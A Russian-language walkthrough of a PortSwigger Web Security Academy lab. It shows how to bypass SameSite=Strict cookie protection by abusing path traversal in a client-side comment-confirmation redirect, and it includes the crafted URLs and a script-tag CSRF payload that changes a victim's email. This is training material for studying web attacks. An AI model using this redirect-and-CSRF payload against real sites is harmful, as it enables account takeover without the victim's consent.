Залогинимся под `wiener:peter`

изменим почтовый ящик на `change@me.com`

найдем в `Proxy` -> `HTTP history` запрос на изменение почты
```
POST /my-account/change-email
...
email=change%40me.com&submit=1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/1.png)
Отправим данный запрос в Repeater и нажмем `ПКМ` -> `Change request method`
и получим запрос следующего вида 
```
GET /my-account/change-email?email=change2%40me.com&submit=1
```
и увидим, что он прошел удачно, и почта действиельно сменилась на `change2@me.com`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/2.png)

Далее перейдем в рандомный блог и запостим любой комментарий к случайному посту

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/3.png)

Далее вернемся в `Proxy` -> `HTTP history` и посмотрим последовательность запросов при отправке комментариев

На данном запросе мы отправили наш комментарий к посту
```
POST /post/comment HTTP/2
...
postId=7&comment=qwe&name=1&email=2%402&website=http%3A%2F%2Fqq.ru
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/4.png)
Далее идет страничка-заглушка, после которой выполнится редирект, при котором выполнится скрипт  `/resources/js/commentConfirmationRedirect.js`
```
GET /post/comment/confirmation?postId=7
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/5.png)

а потом видим вызов данного скрипта, в котором указывается `ID поста`, к которому мы писали коммент, чтобы именно к нему нас и редиректунли
```
GET /resources/js/commentConfirmationRedirect.js
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/6.png)
Далее воспроизведем `GET` запрос (который `GET /post/comment/confirmation?postId=7`) в URL, но попробуем заставить его редиректнуть на страницу `my-account`
```
https://0a79005003c5229085281d1c0071001b.web-security-academy.net/post/comment/confirmation?postId=../my-account
```
и после небольшой задержки увидим, что страница не найдена

Не удивительно, ведь мы обратились к 
```
https://0a79005003c5229085281d1c0071001b.web-security-academy.net/post/my-account
```
а нужно к 
```
https://0a79005003c5229085281d1c0071001b.web-security-academy.net/my-account
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/7.png)

Попробуем обойти данное ограничение, выйдя из данной директории добавив `../` к запросу, получив
```
https://0a79005003c5229085281d1c0071001b.web-security-academy.net/post/comment/confirmation?postId=../my-account
```
и видим, что нас редиректнуло на нужную страницу

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/8.png)

Далее попробуем изменить почту способом, который мы с вами ранее обнаружили, добавив к запросу `change-email?email=change2%40me.com&submit=1`

Итого, наш полный запрос будет выглядеть как 
```
https://0a79005003c5229085281d1c0071001b.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=change3%40me.com&submit=1
```

и видим, что запрос не прошел, изменим `&` в URL кодировке, это будет `%26`

Итого полный запрос будет выглядеть как
```
https://0a79005003c5229085281d1c0071001b.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=change3%40me.com%26submit=1
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/9.png)

И увидим, что почта изменилась, и мы близки к цели

Оформим данный запрос как script для выполнения
```
<script>
  window.location ="https://0a79005003c5229085281d1c0071001b.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=change4%40me.com%26submit=1"
</script>
```

Нажмем `store` и `Deliver Exploit to victim` и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/8.%20SameSite%20Strict%20bypass%20via%20client-side%20redirect/pics%20for%20walkthrough/10.png)
